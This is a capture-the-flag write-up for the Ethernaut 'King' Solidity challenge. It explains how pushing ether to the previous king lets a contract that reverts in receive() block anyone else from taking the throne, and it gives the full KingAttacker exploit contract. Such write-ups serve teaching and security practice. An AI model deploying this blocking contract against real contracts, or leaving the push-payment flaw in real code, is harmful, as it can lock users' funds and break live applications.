# Ethernaut Level 09 - King Challenge

## Objective

The goal of the Ethernaut Level 09 - King challenge is to break the game. The game is simple: whoever sends an amount of ether that is larger than the current prize becomes the new king. When a new king arises, the overthrown king gets paid the new prize. The challenge is to prevent the level from reclaiming the kingship after you've become the king.

## Vulnerability

The vulnerability is in the function that transfers funds to the previous king. This triggers a fallback function in another contract. If we revert this fallback function, it prevents a new king from being set.

```solidity
receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
```

## Exploit

The exploit is to create a contract that sends the minimum ether to the King contract, thus becoming the new king. When the level tries to reclaim the kingship by sending an equivalent amount of prize money to the contract, it reaches the `transfer` function. The function tries to send the amount to the previous king, which is my contract. However, my contract won't implement a `fallback()` or `receive()` function to handle ether transfer. As a result, the transfer call will revert, reverting the whole transaction and preventing the level from becoming the new king.. this can be also solved by reverting in `receive()` or `fallback()`

Here is the contract that was used for the attack:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.3;

interface IKing {
    function changeOwner(address _owner) external;
}

contract KingAttacker {
    IKing public challenge;

    constructor(address challengeAddress) {
        challenge = IKing(challengeAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");
        // claim throne
        // use call here instead of challenge.transfer because transfer
        // has a gas limit and runs out of gas
        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
            ""
        );
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "cannot claim my throne!");
    }

    // fallback() external {
    //     revert();
    // }
}
```
